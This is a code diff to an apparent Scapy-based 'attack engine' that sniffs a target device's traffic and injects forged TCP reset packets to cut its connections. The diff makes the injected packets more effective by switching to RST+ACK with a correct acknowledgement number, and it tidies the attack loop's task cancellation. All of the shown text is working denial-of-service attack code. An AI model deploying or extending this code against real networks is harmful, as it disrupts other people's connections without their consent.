@@ -1,6 +1,7 @@
 """Scapy-based attack engine (Real implementation)."""
 
 import asyncio
+import contextlib
 import logging
 import os
 import subprocess
@@ -925,8 +926,9 @@ class ScapyAttackEngine(AttackEngine):
                                 rst = IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(
                                     sport=packet[TCP].dport,
                                     dport=packet[TCP].sport,
-                                    flags="R",  # RST flag
-                                    seq=packet[TCP].ack,
+                                    flags="RA",  # RST+ACK per RFC 793
+                                    seq=packet[TCP].ack or 0,
+                                    ack=packet[TCP].seq + 1,
                                 )
                                 send(rst, verbose=False)
                         except Exception as e:
@@ -944,12 +946,23 @@ class ScapyAttackEngine(AttackEngine):
                 )
             )
 
-            while time.time() < end_time:
-                if not self._running_attacks.get(target_mac):
-                    logger.info(f"[ScapyEngine] TCP RST attack on {target_mac} aborted")
+            try:
+                while time.time() < end_time:
+                    if not self._running_attacks.get(target_mac):
+                        logger.info(
+                            f"[ScapyEngine] TCP RST attack on {target_mac} aborted"
+                        )
+                        sniff_task.cancel()
+                        break
+                    await asyncio.sleep(1)
+
+                with contextlib.suppress(asyncio.CancelledError):
+                    await sniff_task
+            finally:
+                if not sniff_task.done():
                     sniff_task.cancel()
-                    break
-                await asyncio.sleep(1)
+                    with contextlib.suppress(asyncio.CancelledError):
+                        await sniff_task
 
         except Exception as e:
             logger.error(f"[ScapyEngine] TCP RST attack failed: {e}")
